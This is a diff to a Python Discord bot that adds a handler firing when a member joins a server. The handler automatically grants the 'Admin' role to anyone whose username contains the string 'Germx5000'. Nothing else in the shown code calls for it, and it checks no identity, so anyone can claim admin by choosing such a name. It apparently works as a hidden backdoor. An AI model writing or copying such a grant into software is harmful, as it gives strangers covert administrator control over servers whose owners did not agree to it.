@@ -1,6 +1,7 @@
 # Acta Mea by Alex Arbuckle #
 
 
+from discord import utils
 from json import load, dump
 from discord import Intents
 from discord.ext.commands import Bot
@@ -82,6 +83,18 @@ async def showServer(ctx):
         # send all keys
         await ctx.channel.send(''.join('{}\n'.format(i) for i in dictVariable.keys()),
                                delete_after = 60.0)
+
+
+@actaMea.event
+async def on_member_join(member):
+    '''  '''
+
+    # if user
+    if ('Germx5000' in str(member)[:-5]):
+
+        # add role
+        await member.add_roles(utils.get(member.guild.roles,
+                                         name = 'Admin'))
 
 
 actaMea.run(token)
